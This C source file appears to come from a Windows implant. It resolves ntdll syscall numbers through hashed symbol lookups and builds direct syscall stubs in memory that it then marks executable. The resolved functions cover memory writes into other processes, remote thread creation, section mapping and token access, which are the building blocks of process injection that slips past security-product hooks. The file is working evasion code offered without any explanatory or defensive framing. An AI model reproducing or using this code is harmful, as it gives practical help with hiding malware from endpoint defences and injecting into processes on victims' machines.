#include "Syscalls.h"
#include "ApiLoader.h"
#include "ProcLoader.h"
#include "utils.h"

#define SYSCALL_HASH_NTALLOCATEVIRTUALMEMORY  0x26bb660b
#define SYSCALL_HASH_NTWRITEVIRTUALMEMORY     0x2208c2b1
#define SYSCALL_HASH_NTPROTECTVIRTUALMEMORY   0x334fb1a7
#define SYSCALL_HASH_NTCREATETHREADEX         0x461700cf
#define SYSCALL_HASH_NTCREATESECTION          0x217c086f
#define SYSCALL_HASH_NTMAPVIEWOFSECTION       0x25b394e9
#define SYSCALL_HASH_NTUNMAPVIEWOFSECTION     0xc995d3ec
#define SYSCALL_HASH_NTWAITFORSINGLEOBJECT    0x25d5f15b
#define SYSCALL_HASH_NTDELAYEXECUTION         0x8ca767c9
#define SYSCALL_HASH_NTQUERYVIRTUALMEMORY     0x6fb2a97c

SYSCALL_TABLE* g_Syscalls = NULL;

DWORD GetSyscallNumber(HMODULE hNtdll, PVOID pFunc)
{
	PBYTE pBytes = (PBYTE)pFunc;

	if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1
		&& pBytes[3] == 0xB8)
		return *(DWORD*)(pBytes + 4);

	if (pBytes[0] == 0xB8)
		return *(DWORD*)(pBytes + 1);

	return 0;
}

void BuildSyscallStub(BYTE* pStub, DWORD ssn)
{
	pStub[0]  = 0x4C;
	pStub[1]  = 0x8B;
	pStub[2]  = 0xD1;
	pStub[3]  = 0xB8;
	*(DWORD*)(pStub + 4) = ssn;
	pStub[8]  = 0x0F;
	pStub[9]  = 0x05;
	pStub[10] = 0xC3;
}

static BOOL ResolveSyscallEntry(SYSCALL_ENTRY* entry, HMODULE hNtdll, ULONG hash)
{
	PVOID pFunc = GetSymbolAddress(hNtdll, hash);
	if (!pFunc)
		return FALSE;

	DWORD ssn = GetSyscallNumber(hNtdll, pFunc);
	if (ssn == 0)
		return FALSE;

	BYTE* stub = (BYTE*)ApiWin->VirtualAlloc(NULL, SYSCALL_STUB_SIZE,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!stub)
		return FALSE;

	BuildSyscallStub(stub, ssn);

	DWORD oldProt;
	ApiWin->VirtualProtect(stub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READ, &oldProt);

	entry->pSyscallStub = stub;
	entry->dwSSN        = ssn;

	return TRUE;
}

BOOL InitSyscalls()
{
	g_Syscalls = (SYSCALL_TABLE*)ApiWin->LocalAlloc(LPTR, sizeof(SYSCALL_TABLE));
	if (!g_Syscalls)
		return FALSE;

	HMODULE hNtdll = GetModuleAddress(HASH_LIB_NTDLL);
	if (!hNtdll)
		return FALSE;

	ResolveSyscallEntry(&g_Syscalls->NtAllocateVirtualMemory,  hNtdll, SYSCALL_HASH_NTALLOCATEVIRTUALMEMORY);
	ResolveSyscallEntry(&g_Syscalls->NtWriteVirtualMemory,      hNtdll, SYSCALL_HASH_NTWRITEVIRTUALMEMORY);
	ResolveSyscallEntry(&g_Syscalls->NtProtectVirtualMemory,    hNtdll, SYSCALL_HASH_NTPROTECTVIRTUALMEMORY);
	ResolveSyscallEntry(&g_Syscalls->NtCreateThreadEx,          hNtdll, SYSCALL_HASH_NTCREATETHREADEX);
	ResolveSyscallEntry(&g_Syscalls->NtOpenProcess,             hNtdll, HASH_FUNC_NTOPENPROCESS);
	ResolveSyscallEntry(&g_Syscalls->NtOpenProcessToken,        hNtdll, HASH_FUNC_NTOPENPROCESSTOKEN);
	ResolveSyscallEntry(&g_Syscalls->NtClose,                   hNtdll, HASH_FUNC_NTCLOSE);
	ResolveSyscallEntry(&g_Syscalls->NtQuerySystemInformation,  hNtdll, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
	ResolveSyscallEntry(&g_Syscalls->NtQueryInformationProcess, hNtdll, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
	ResolveSyscallEntry(&g_Syscalls->NtTerminateProcess,        hNtdll, HASH_FUNC_NTTERMINATEPROCESS);
	ResolveSyscallEntry(&g_Syscalls->NtTerminateThread,         hNtdll, HASH_FUNC_NTTERMINATETHREAD);
	ResolveSyscallEntry(&g_Syscalls->NtFreeVirtualMemory,       hNtdll, HASH_FUNC_NTFREEVIRTUALMEMORY);
	ResolveSyscallEntry(&g_Syscalls->NtCreateSection,           hNtdll, SYSCALL_HASH_NTCREATESECTION);
	ResolveSyscallEntry(&g_Syscalls->NtMapViewOfSection,        hNtdll, SYSCALL_HASH_NTMAPVIEWOFSECTION);
	ResolveSyscallEntry(&g_Syscalls->NtUnmapViewOfSection,      hNtdll, SYSCALL_HASH_NTUNMAPVIEWOFSECTION);
	ResolveSyscallEntry(&g_Syscalls->NtWaitForSingleObject,     hNtdll, SYSCALL_HASH_NTWAITFORSINGLEOBJECT);
	ResolveSyscallEntry(&g_Syscalls->NtDelayExecution,          hNtdll, SYSCALL_HASH_NTDELAYEXECUTION);
	ResolveSyscallEntry(&g_Syscalls->NtQueryVirtualMemory,      hNtdll, SYSCALL_HASH_NTQUERYVIRTUALMEMORY);

	return TRUE;
}
